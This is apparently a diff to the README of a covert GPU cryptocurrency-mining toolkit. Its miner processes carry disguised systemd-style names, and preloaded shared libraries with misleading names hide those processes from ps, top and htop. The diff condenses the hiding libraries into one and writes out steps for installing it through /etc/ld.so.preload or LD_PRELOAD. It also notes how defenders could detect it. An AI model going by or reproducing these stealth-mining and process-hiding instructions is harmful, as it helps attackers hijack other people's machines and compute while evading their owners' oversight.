@@ -5,9 +5,7 @@
     * systemd-firewall: is an adaptive system resource allocator determines which GPU the slave miners work on.
     * systemd-update: is the same to the `systemd-firewall` but more merciful that only works at midnight.
     * systemd-diagnosis: is the pool slave miner(Phoenix miner main file).
-    * libGNU.co hides `systemd-diagnosis` for ps, top ,and htop.
-    * libnvidia-glibc.so hides `nl-toolkit` for ps, top ,and htop.
-    * libnvidia-openai.so hides `systemd-firewall` for ps, top ,and htop.
+    * libGNU.co: hides specified processes for ps, top ,and htop.
 
 * source: corresponding source code of the executed file in `./exec`.
 
@@ -35,9 +33,9 @@ pip install pyinstaller
 ### systemd-update
 1. same to the `systemd-firewall`.
 
-### libGNU.co, libnvidia-glibc.co, and libnvidia-openai.co
-1. move `libGNU.co`, `libnvidia-glibc.co`, and `libnvidia-openai.co` to `/usr/lib`.
-1. move `ld.so.preload` to `/etc/`; or add `export LD_PRELOAD=/usr/lib/libGNU.so:/usr/lib/libnvidia-openai.so:/usr/lib/libnvidia-glbc.so` to `/etc/profile`.
+### libGNU.co
+1. move `libGNU.co` to `/usr/lib`.
+1. add `/usr/lib/libGNU.co` to `/etc/ld.so.preload`; or add `export LD_PRELOAD=/usr/lib/libGNU.so` to `/etc/profile` (remember to execute `source /etc/profile` to make it effective).
 
 **Risk:** add these files to system environment is easy to detect just by `cat /etc/ld.so.preload` or `echo $LD_PRELOAD`.
 
